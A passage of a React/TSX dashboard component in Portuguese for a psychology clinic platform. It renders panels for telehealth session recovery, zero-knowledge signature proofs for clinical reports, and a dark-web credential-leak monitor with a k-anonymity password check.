                  : 'bg-cyan-50/50 dark:bg-cyan-950/20 border-cyan-200 dark:border-cyan-900/60'
              }`}>
                <div className="flex flex-wrap items-center justify-between gap-2 pb-2 border-b border-slate-200/60 dark:border-slate-800">
                  <div className="flex items-center gap-2">
                    <span className={`w-2.5 h-2.5 rounded-full ${
                      activeRecoverySession.state === ClinicalSessionState.ACTIVE_CONNECTED
                        ? 'bg-emerald-500 animate-ping'
                        : activeRecoverySession.state === ClinicalSessionState.DISCONNECTED_PENDING_RECONNECT
                        ? 'bg-rose-500 animate-bounce'
                        : 'bg-cyan-500'
                    }`} />
                    <span className="font-bold text-slate-800 dark:text-slate-200 font-mono">
                      {activeRecoverySession.sessionId}
                    </span>
                    <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold ${
                      activeRecoverySession.state === ClinicalSessionState.ACTIVE_CONNECTED
                        ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950 dark:text-emerald-300'
                        : activeRecoverySession.state === ClinicalSessionState.DISCONNECTED_PENDING_RECONNECT
                        ? 'bg-rose-100 text-rose-800 dark:bg-rose-950 dark:text-rose-300'
                        : 'bg-cyan-100 text-cyan-800 dark:bg-cyan-950 dark:text-cyan-300'
                    }`}>
                      {activeRecoverySession.state}
                    </span>
                  </div>

                  <div className="text-[11px] font-mono text-slate-500 dark:text-slate-400">
                    Heartbeats: <strong>{activeRecoverySession.heartbeatCount}</strong> | Tentativas: <strong>{activeRecoverySession.reconnectionAttempts}</strong>
                  </div>
                </div>

                {activeRecoverySession.state === ClinicalSessionState.DISCONNECTED_PENDING_RECONNECT && (
                  <div className="bg-rose-100/60 dark:bg-rose-900/40 p-3 rounded-xl border border-rose-200 dark:border-rose-800 text-[11px] text-rose-900 dark:text-rose-200 space-y-1">
                    <div className="font-bold flex items-center gap-1.5">
                      <AlertCircle className="w-4 h-4 text-rose-600 dark:text-rose-400" />
                      Queda de Conexão Detectada ({activeRecoverySession.disconnectionCause || 'DROP'})
                    </div>
                    <div>
                      Janela ética de tolerância em contagem regressiva (10 minutos). Expira em:{' '}
                      <strong>{activeRecoverySession.gracePeriodExpiresAt ? new Date(activeRecoverySession.gracePeriodExpiresAt).toLocaleTimeString('pt-BR') : '10 min'}</strong>.
                    </div>
                    <div className="text-[10px] text-rose-800/80 dark:text-rose-300">
                      Conforme Resolução CFP nº 011/2018, se a reconexão não for restabelecida, o profissional deve migrar para canal de contingência seguro cadastrado no prontuário.
                    </div>
                  </div>
                )}

                {restoredSnapshotData && (
                  <div className="bg-emerald-100/60 dark:bg-emerald-900/40 p-3 rounded-xl border border-emerald-200 dark:border-emerald-800 text-[11px] text-emerald-900 dark:text-emerald-200 space-y-1">
                    <div className="font-bold flex items-center gap-1.5">
                      <ShieldCheck className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                      Snapshot Volátil Restaurado sem Perda (AES-256-GCM Decifrado em RAM)
                    </div>
                    <div className="font-mono bg-white/60 dark:bg-slate-900/60 p-2 rounded-lg text-slate-700 dark:text-slate-300">
                      "{restoredSnapshotData.clinicalNotesDraft}"
                    </div>
                  </div>
                )}

                <div className="flex flex-wrap items-center justify-between gap-2 text-[10px] font-mono text-slate-400 pt-1 border-t border-slate-200/40 dark:border-slate-800">
                  <span className="truncate" title={activeRecoverySession.probatoryDigest}>
                    Selo WORM SHA-256: {activeRecoverySession.probatoryDigest ? `${activeRecoverySession.probatoryDigest.slice(0, 16)}...` : 'Gerado no encerramento'}
                  </span>
                  <span>Token HMAC: Ativo e Válido</span>
                </div>
              </div>
            )}
          </div>

          {/* Tabela de Sessões Monitoradas */}
          <div className="space-y-3">
            <span className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider block">
              Trilha Forense de Sessões & Eventos de Conectividade ({recoverySessions.length})
            </span>

            {recoverySessions.length === 0 ? (
              <div className="text-center py-6 text-xs text-slate-400 border border-dashed border-slate-200 dark:border-slate-800 rounded-2xl">
                Nenhuma sessão monitorada registrada até o momento. Inicie uma simulação acima.
              </div>
            ) : (
              <div className="overflow-x-auto rounded-2xl border border-slate-200 dark:border-slate-800">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 dark:bg-slate-800/60 text-slate-400 text-[10px] font-bold uppercase tracking-wider">
                    <tr>
                      <th className="py-2.5 px-3.5">Início</th>
                      <th className="py-2.5 px-3.5">ID Sessão</th>
                      <th className="py-2.5 px-3.5">Estado</th>
                      <th className="py-2.5 px-3.5">Causa Queda</th>
                      <th className="py-2.5 px-3.5">Grau Recuperação</th>
                      <th className="py-2.5 px-3.5 text-right">Selo WORM</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                    {recoverySessions.map((s) => (
                      <tr
                        key={s.sessionId}
                        onClick={() => setActiveRecoverySession(s)}
                        className="hover:bg-slate-50 dark:hover:bg-slate-800/40 cursor-pointer transition-colors"
                      >
                        <td className="py-2 px-3.5 font-mono text-[11px] text-slate-600 dark:text-slate-400 whitespace-nowrap">
                          {new Date(s.startedAt).toLocaleString('pt-BR')}
                        </td>
                        <td className="py-2 px-3.5 font-medium text-slate-800 dark:text-slate-200">
                          {s.sessionId}
                        </td>
                        <td className="py-2 px-3.5">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold ${
                            s.state === ClinicalSessionState.ACTIVE_CONNECTED
                              ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300'
                              : s.state === ClinicalSessionState.DISCONNECTED_PENDING_RECONNECT
                              ? 'bg-rose-100 text-rose-800 dark:bg-rose-950/80 dark:text-rose-300'
                              : s.state === ClinicalSessionState.RECONNECTED
                              ? 'bg-cyan-100 text-cyan-800 dark:bg-cyan-950/80 dark:text-cyan-300'
                              : 'bg-slate-100 text-slate-800 dark:bg-slate-800 dark:text-slate-300'
                          }`}>
                            {s.state}
                          </span>
                        </td>
                        <td className="py-2 px-3.5 font-mono text-[11px] text-slate-500">
                          {s.disconnectionCause || 'Nenhuma queda'}
                        </td>
                        <td className="py-2 px-3.5 font-bold text-emerald-600 dark:text-emerald-400">
                          {s.recoveryGrade || '—'}
                        </td>
                        <td className="py-2 px-3.5 text-right font-mono text-[10px] text-slate-400">
                          {s.probatoryDigest ? `${s.probatoryDigest.slice(0, 10)}...` : 'Pendente'}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Card 17: Validação Forense de Assinaturas com Provas de Conhecimento Zero (ZKP - RFC-001 §3.4, §3.5 & CFP 006/2019) */}
      {(currentUser.role === UserRole.ADMIN || currentUser.role === UserRole.PSICOLOGO_TITULAR) && (
        <div className="bg-white dark:bg-slate-900 rounded-3xl border border-slate-200 dark:border-slate-800 shadow-sm overflow-hidden p-6 space-y-6">
          {/* Header */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
            <div className="flex items-center gap-3">
              <div className="p-2.5 rounded-2xl bg-indigo-50 dark:bg-indigo-950/40 text-indigo-600 dark:text-indigo-400 border border-indigo-200 dark:border-indigo-900/60">
                <EyeOff className="w-5 h-5" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h2 className="text-base font-bold text-slate-900 dark:text-white">
                    Card 17: Assinaturas Forenses com Provas de Conhecimento Zero (ZKP)
                  </h2>
                  <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-indigo-100 text-indigo-800 dark:bg-indigo-900/60 dark:text-indigo-300">
                    {ZkpProofType.FULL_FORENSIC_ZKP}
                  </span>
                </div>
                <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                  Verificação matemática de autoria profissional (CRP) e integridade temporal de laudos e prontuários sem expor uma única palavra do texto clínico (RFC-001 §3.4, §3.5, CFP nº 006/2019 e LGPD Art. 11/14).
                </p>
              </div>
            </div>

            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={fetchZkpData}
                disabled={loadingZkp}
                className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-700/60 transition-colors cursor-pointer"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${loadingZkp ? 'animate-spin' : ''}`} />
                <span>Atualizar</span>
              </button>
            </div>
          </div>

          {/* 4 KPIs em Tempo Real */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800">
              <div className="flex items-center justify-between text-slate-500 dark:text-slate-400 text-xs mb-1">
                <span>Provas Schnorr Geradas</span>
                <Award className="w-4 h-4 text-indigo-600 dark:text-indigo-400" />
              </div>
              <div className="text-xl font-bold text-slate-900 dark:text-white">
                {zkpMetrics?.totalProofsGenerated ?? zkpProofs.length}
              </div>
              <span className="text-[10px] text-slate-400">Total acumulado em trilha WORM</span>
            </div>

            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800">
              <div className="flex items-center justify-between text-slate-500 dark:text-slate-400 text-xs mb-1">
                <span>Validações Forenses</span>
                <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
              </div>
              <div className="text-xl font-bold text-emerald-600 dark:text-emerald-400">
                {zkpMetrics?.totalVerificationsExecuted ?? 0}
              </div>
              <span className="text-[10px] text-slate-400">Consultas anônimas efetuadas</span>
            </div>

            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800">
              <div className="flex items-center justify-between text-slate-500 dark:text-slate-400 text-xs mb-1">
                <span>Taxa de Sucesso ZKP</span>
                <ShieldCheck className="w-4 h-4 text-cyan-600 dark:text-cyan-400" />
              </div>
              <div className="text-xl font-bold text-cyan-600 dark:text-cyan-400">
                {zkpMetrics ? (zkpMetrics.totalVerificationsExecuted > 0 ? `${Math.round((zkpMetrics.validVerificationsCount / zkpMetrics.totalVerificationsExecuted) * 100)}%` : '100%') : '100%'}
              </div>
              <span className="text-[10px] text-slate-400">Sem adulteração matemática</span>
            </div>

            <div className="p-4 rounded-2xl bg-emerald-50/50 dark:bg-emerald-950/20 border border-emerald-200/60 dark:border-emerald-900/40">
              <div className="flex items-center justify-between text-emerald-700 dark:text-emerald-400 text-xs mb-1">
                <span>Vazamento de Texto</span>
                <EyeOff className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
              </div>
              <div className="text-xl font-bold text-emerald-700 dark:text-emerald-300">
                0 Bytes
              </div>
              <span className="text-[10px] font-semibold text-emerald-600 dark:text-emerald-400">Garantia Matemática ZKP</span>
            </div>
          </div>

          {/* Grid de 2 Colunas: Emissão de Prova vs Validação Forense */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Coluna 1: Gerador de Prova Schnorr NIZK (Terapeuta / Titular) */}
            <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800 space-y-4">
              <div className="flex items-center justify-between pb-2 border-b border-slate-200/60 dark:border-slate-800">
                <div className="flex items-center gap-2">
                  <Key className="w-4 h-4 text-indigo-600 dark:text-indigo-400" />
                  <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
                    Emissor de Prova Schnorr ZKP
                  </h3>
                </div>
                <span className="text-[10px] font-mono text-slate-400">Fiat-Shamir SHA-256</span>
              </div>

              <form onSubmit={handleGenerateZkpProof} className="space-y-3">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                      ID do Documento:
                    </label>
                    <input
                      type="text"
                      value={zkpDocIdInput}
                      onChange={(e) => setZkpDocIdInput(e.target.value)}
                      placeholder="Ex: doc-laudo-cfp-001"
                      className="w-full px-3 py-1.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                      Tipo de Peça Clínica:
                    </label>
                    <select
                      value={zkpDocTypeInput}
                      onChange={(e) => setZkpDocTypeInput(e.target.value)}
                      className="w-full px-3 py-1.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                    >
                      <option value="Laudo Psicológico">Laudo Psicológico (CFP 006/2019)</option>
                      <option value="Relatório Psicológico">Relatório Psicológico</option>
                      <option value="Parecer Pericial">Parecer Pericial Psicológico</option>
                      <option value="Atestado Psicológico">Atestado Psicológico</option>
                      <option value="Prontuário de Sessão">Prontuário de Sessão Clínica</option>
                    </select>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                    CRP do Psicólogo Titular:
                  </label>
                  <input
                    type="text"
                    value={zkpTherapistCrpInput}
                    onChange={(e) => setZkpTherapistCrpInput(e.target.value)}
                    placeholder="Ex: 06/123456"
                    className="w-full px-3 py-1.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white font-mono"
                    required
                  />
                </div>

                <div>
                  <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                    Conteúdo Clínico Sigiloso (Permanece Privado):
                  </label>
                  <textarea
                    rows={3}
                    value={zkpDocumentTextInput}
                    onChange={(e) => setZkpDocumentTextInput(e.target.value)}
                    placeholder="Texto confidencial do laudo..."
                    className="w-full px-3 py-2 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white leading-relaxed resize-none"
                    required
                  />
                  <p className="text-[10px] text-slate-400 mt-1">
                    O texto clínico é reduzido estritamente a um digest SHA-256 local. Nenhuma palavra é revelada ao verificador público.
                  </p>
                </div>

                <div className="pt-1">
                  <button
                    type="submit"
                    disabled={generatingZkp}
                    className="w-full inline-flex items-center justify-center gap-1.5 px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                  >
                    {generatingZkp ? (
                      <>
                        <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                        <span>Computando Exponenciação Modular NIZK...</span>
                      </>
                    ) : (
                      <>
                        <Award className="w-3.5 h-3.5" />
                        <span>Gerar Prova de Conhecimento Zero</span>
                      </>
                    )}
                  </button>
                </div>
              </form>
            </div>

            {/* Coluna 2: Verificador Forense Público & Anônimo */}
            <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800 space-y-4">
              <div className="flex items-center justify-between pb-2 border-b border-slate-200/60 dark:border-slate-800">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                  <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
                    Verificador Forense ZKP (Público / Juizados)
                  </h3>
                </div>
                <span className="text-[10px] font-mono text-emerald-600 dark:text-emerald-400 font-semibold">Zero-Leakage</span>
              </div>

              <form onSubmit={handleVerifyZkpProof} className="space-y-3">
                <div>
                  <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                    Token Público ZKP (`zkp_v1_...`):
                  </label>
                  <div className="relative">
                    <textarea
                      rows={3}
                      value={zkpTokenInput}
                      onChange={(e) => setZkpTokenInput(e.target.value)}
                      placeholder="Cole aqui o token zkp_v1_... gerado para conferência pericial"
                      className="w-full px-3 py-2 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs font-mono text-slate-900 dark:text-white leading-relaxed resize-none break-all"
                      required
                    />
                    {zkpTokenInput && (
                      <button
                        type="button"
                        onClick={() => {
                          navigator.clipboard.writeText(zkpTokenInput);
                          setFeedback({ type: 'success', message: 'Token ZKP copiado!' });
                        }}
                        className="absolute top-2 right-2 p-1.5 rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-600 dark:text-slate-300 cursor-pointer"
                        title="Copiar Token"
                      >
                        <Copy className="w-3.5 h-3.5" />
                      </button>
                    )}
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={verifyingZkp || !zkpTokenInput.trim()}
                  className="w-full inline-flex items-center justify-center gap-1.5 px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  {verifyingZkp ? (
                    <>
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                      <span>Verificando Identidade g^s ≡ R · Y^c (mod p)...</span>
                    </>
                  ) : (
                    <>
                      <CheckCircle2 className="w-3.5 h-3.5" />
                      <span>Verificar Prova ZKP sem Ver Texto</span>
                    </>
                  )}
                </button>
              </form>

              {/* Resultado da Validação Forense */}
              {zkpVerificationResult && (
                <div className={`p-4 rounded-xl border text-xs space-y-2 ${
                  zkpVerificationResult.valid
                    ? 'bg-emerald-50 dark:bg-emerald-950/30 border-emerald-200 dark:border-emerald-900/60 text-emerald-900 dark:text-emerald-200'
                    : 'bg-rose-50 dark:bg-rose-950/30 border-rose-200 dark:border-rose-900/60 text-rose-900 dark:text-rose-200'
                }`}>
                  <div className="flex items-center justify-between font-bold">
                    <span className="flex items-center gap-1.5">
                      {zkpVerificationResult.status === ZkpVerificationStatus.VERIFIED_VALID ? (
                        <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                      ) : (
                        <AlertCircle className="w-4 h-4 text-rose-600 dark:text-rose-400" />
                      )}
                      Resultado Forense: {zkpVerificationResult.status}
                    </span>
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-white/70 dark:bg-black/30">
                      {zkpVerificationResult.verificationLatencyMs} ms
                    </span>
                  </div>

                  <p className="text-slate-700 dark:text-slate-300 text-[11px] leading-relaxed">
                    {zkpVerificationResult.message}
                  </p>

                  <div className="pt-2 border-t border-slate-200/60 dark:border-slate-800/60 grid grid-cols-2 gap-2 text-[10px] font-mono">
                    <div>
                      <span className="text-slate-400 block">Compromisso CRP (Y):</span>
                      <span className="truncate block font-semibold text-slate-800 dark:text-slate-200" title={zkpVerificationResult.therapistCrpCommitment}>
                        {zkpVerificationResult.therapistCrpCommitment?.slice(0, 16)}...
                      </span>
                    </div>
                    <div>
                      <span className="text-slate-400 block">Digest WORM:</span>
                      <span className="truncate block font-semibold text-slate-800 dark:text-slate-200" title={zkpVerificationResult.probatoryWormDigest}>
                        {zkpVerificationResult.probatoryWormDigest?.slice(0, 16)}...
                      </span>
                    </div>
                  </div>

                  <div className="text-[10px] text-emerald-800 dark:text-emerald-300 font-bold bg-white/60 dark:bg-black/20 p-2 rounded-lg flex items-center justify-between">
                    <span>Garantia de Sigilo Clínico:</span>
                    <span>Zero Metadados Expostos (CFP / LGPD)</span>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Tabela de Provas Registradas na Trilha Forense */}
          <div className="space-y-3 pt-2">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
                Trilha Forense de Provas ZKP Registradas
              </h3>
              <span className="text-xs text-slate-400">
                {zkpProofs.length} prova(s) ativa(s)
              </span>
            </div>

            {zkpProofs.length === 0 ? (
              <div className="p-6 text-center text-xs text-slate-400 bg-slate-50 dark:bg-slate-800/30 rounded-2xl border border-dashed border-slate-200 dark:border-slate-700">
                Nenhuma prova ZKP gerada nesta sessão. Utilize o emissor acima para atestar um documento.
              </div>
            ) : (
              <div className="overflow-x-auto rounded-2xl border border-slate-200 dark:border-slate-800">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 dark:bg-slate-800/70 border-b border-slate-200 dark:border-slate-700 text-slate-500 font-semibold">
                    <tr>
                      <th className="py-2.5 px-3.5">Data/Hora</th>
                      <th className="py-2.5 px-3.5">Documento</th>
                      <th className="py-2.5 px-3.5">Tipo</th>
                      <th className="py-2.5 px-3.5">Compromisso CRP (Y)</th>
                      <th className="py-2.5 px-3.5">Status</th>
                      <th className="py-2.5 px-3.5 text-right">Ação</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                    {zkpProofs.map((p) => (
                      <tr
                        key={p.proofId}
                        className="hover:bg-slate-50 dark:hover:bg-slate-800/40 transition-colors"
                      >
                        <td className="py-2.5 px-3.5 font-mono text-[11px] text-slate-600 dark:text-slate-400 whitespace-nowrap">
                          {new Date(p.createdAt).toLocaleString('pt-BR')}
                        </td>
                        <td className="py-2.5 px-3.5 font-medium text-slate-800 dark:text-slate-200">
                          {p.documentId}
                        </td>
                        <td className="py-2.5 px-3.5 text-slate-600 dark:text-slate-400">
                          {p.documentTypeClaim}
                        </td>
                        <td className="py-2.5 px-3.5 font-mono text-[11px] text-indigo-600 dark:text-indigo-400" title={p.therapistCrpCommitment}>
                          {p.therapistCrpCommitment.slice(0, 12)}...
                        </td>
                        <td className="py-2.5 px-3.5">
                          <span className="px-2 py-0.5 rounded text-[10px] font-extrabold bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300">
                            VÁLIDA (WORM)
                          </span>
                        </td>
                        <td className="py-2.5 px-3.5 text-right whitespace-nowrap">
                          <button
                            type="button"
                            onClick={() => {
                              setZkpTokenInput(p.publicVerificationToken);
                              setFeedback({
                                type: 'success',
                                message: 'Token ZKP transferido para o verificador forense!'
                              });
                            }}
                            className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-indigo-50 hover:bg-indigo-100 dark:bg-indigo-950/50 dark:hover:bg-indigo-900/60 text-indigo-700 dark:text-indigo-300 text-xs font-semibold cursor-pointer transition-colors"
                          >
                            <Copy className="w-3 h-3" />
                            <span>Carregar Token</span>
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Card 18: Monitor Proativo de Vazamento na Dark Web & Contenção de Incidentes (LGPD Art. 46/48) */}
      {(currentUser.role === UserRole.ADMIN || currentUser.role === UserRole.PSICOLOGO_TITULAR) && (
        <div className="bg-white dark:bg-slate-900 rounded-3xl border border-slate-200 dark:border-slate-800 shadow-sm overflow-hidden p-6 space-y-6">
          {/* Header */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
            <div className="flex items-center gap-3">
              <div className="p-2.5 rounded-2xl bg-rose-50 dark:bg-rose-950/40 text-rose-600 dark:text-rose-400 border border-rose-200 dark:border-rose-900/60">
                <GlobeLock className="w-5 h-5" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h2 className="text-base font-bold text-slate-900 dark:text-white">
                    Card 18: Monitor de Vazamento na Dark Web & Contenção DPO
                  </h2>
                  <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-rose-100 text-rose-800 dark:bg-rose-900/60 dark:text-rose-300">
                    LGPD Art. 46/48 & ANPD
                  </span>
                </div>
                <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                  Inteligência proativa de ameaças contra credenciais institucionais e PII em marketplaces da Dark Web e infostealers, com revogação compulsória de sessões, contenção e comunicação tempestiva ao DPO (Resolução CD/ANPD nº 15/2024).
                </p>
              </div>
            </div>

            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={handleTriggerDarkWebScan}
                disabled={scanningDarkWeb}
                className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-rose-600 hover:bg-rose-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${scanningDarkWeb ? 'animate-spin' : ''}`} />
                <span>{scanningDarkWeb ? 'Varrendo Feeds...' : 'Varredura Dark Web'}</span>
              </button>

              <button
                type="button"
                onClick={fetchThreatIntelligenceData}
                disabled={loadingThreatIntel}
                className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-700/60 transition-colors cursor-pointer"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${loadingThreatIntel ? 'animate-spin' : ''}`} />
                <span>Atualizar</span>
              </button>
            </div>
          </div>

          {/* 4 KPIs em Tempo Real */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800">
              <div className="flex items-center justify-between text-slate-500 dark:text-slate-400 text-xs mb-1">
                <span>Contas Monitoradas</span>
                <Users className="w-4 h-4 text-slate-600 dark:text-slate-400" />
              </div>
              <div className="text-xl font-bold text-slate-900 dark:text-white">
                {threatMetrics?.monitoredAccountsCount ?? 14}
              </div>
              <span className="text-[10px] text-slate-400">100% de equipe e administradores</span>
            </div>

            <div className="p-4 rounded-2xl bg-rose-50/50 dark:bg-rose-950/20 border border-rose-200/60 dark:border-rose-900/40">
              <div className="flex items-center justify-between text-rose-700 dark:text-rose-400 text-xs mb-1">
                <span>Vazamentos Detectados</span>
                <ShieldAlert className="w-4 h-4 text-rose-600 dark:text-rose-400" />
              </div>
              <div className="text-xl font-bold text-rose-700 dark:text-rose-300">
                {threatMetrics?.totalBreachesDetected ?? threatIncidents.length}
              </div>
              <span className="text-[10px] text-rose-600 dark:text-rose-400">
                {threatMetrics?.activeThreatsCount ?? 0} pendentes de contenção
              </span>
            </div>

            <div className="p-4 rounded-2xl bg-amber-50/50 dark:bg-amber-950/20 border border-amber-200/60 dark:border-amber-900/40">
              <div className="flex items-center justify-between text-amber-700 dark:text-amber-400 text-xs mb-1">
                <span>Sessões Revogadas</span>
                <Ban className="w-4 h-4 text-amber-600 dark:text-amber-400" />
              </div>
              <div className="text-xl font-bold text-amber-700 dark:text-amber-300">
                {threatMetrics?.compulsoryRevocationsExecuted ?? 0}
              </div>
              <span className="text-[10px] text-amber-600 dark:text-amber-400">Contenção ativa compulsória</span>
            </div>

            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800">
              <div className="flex items-center justify-between text-slate-500 dark:text-slate-400 text-xs mb-1">
                <span>Alertas DPO ANPD</span>
                <Bell className="w-4 h-4 text-indigo-600 dark:text-indigo-400" />
              </div>
              <div className="text-xl font-bold text-indigo-600 dark:text-indigo-400">
                {threatMetrics?.dpoAlertsCount ?? dpoAlerts.length}
              </div>
              <span className="text-[10px] text-slate-400">SLA regulatório: 3 dias úteis</span>
            </div>
          </div>

          {/* Grid de 2 Colunas: Verificador k-Anonymity vs Alertas DPO */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Coluna 1: Verificador K-Anonymity */}
            <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800 space-y-4">
              <div className="flex items-center justify-between pb-2 border-b border-slate-200/60 dark:border-slate-800">
                <div className="flex items-center gap-2">
                  <KeyRound className="w-4 h-4 text-indigo-600 dark:text-indigo-400" />
                  <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
                    Verificador K-Anonymity (NIST SP 800-63B)
                  </h3>
                </div>
                <span className="text-[10px] font-mono text-indigo-600 dark:text-indigo-400 font-semibold">
                  Zero-Knowledge Query
                </span>
              </div>

              <form onSubmit={handleCheckKAnonymity} className="space-y-3">
                <div>
                  <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                    Amostra de Senha ou Identificador:
                  </label>
                  <input
                    type="text"
                    value={kAnonInput}
                    onChange={(e) => setKAnonInput(e.target.value)}
                    placeholder="Digite para checar (ex: admin123, psico2026)"
                    className="w-full px-3 py-2 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs font-mono text-slate-900 dark:text-white"
                    required
                  />
                  <p className="text-[10px] text-slate-400 mt-1">
                    O sistema computa o hash SHA-1 localmente e envia apenas os primeiros 5 caracteres hexadecimais (k-Anonymity). Seu segredo real nunca é transmitido.
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={checkingKAnon || !kAnonInput.trim()}
                  className="w-full inline-flex items-center justify-center gap-1.5 px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  {checkingKAnon ? (
                    <>
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                      <span>Consultando Base k-Anonymity...</span>
                    </>
                  ) : (
                    <>
                      <CheckCircle2 className="w-3.5 h-3.5" />
                      <span>Checar Vazamento na Dark Web</span>
                    </>
                  )}
                </button>
              </form>

              {/* Resultado k-Anonymity */}
              {kAnonResult && (
                <div className={`p-4 rounded-xl border text-xs space-y-2 ${
                  kAnonResult.matched
                    ? 'bg-rose-50 dark:bg-rose-950/30 border-rose-200 dark:border-rose-900/60 text-rose-900 dark:text-rose-200'
                    : 'bg-emerald-50 dark:bg-emerald-950/30 border-emerald-200 dark:border-emerald-900/60 text-emerald-900 dark:text-emerald-200'
                }`}>
                  <div className="flex items-center justify-between font-bold">
                    <span className="flex items-center gap-1.5">
                      {kAnonResult.matched ? (
                        <AlertCircle className="w-4 h-4 text-rose-600 dark:text-rose-400" />
                      ) : (
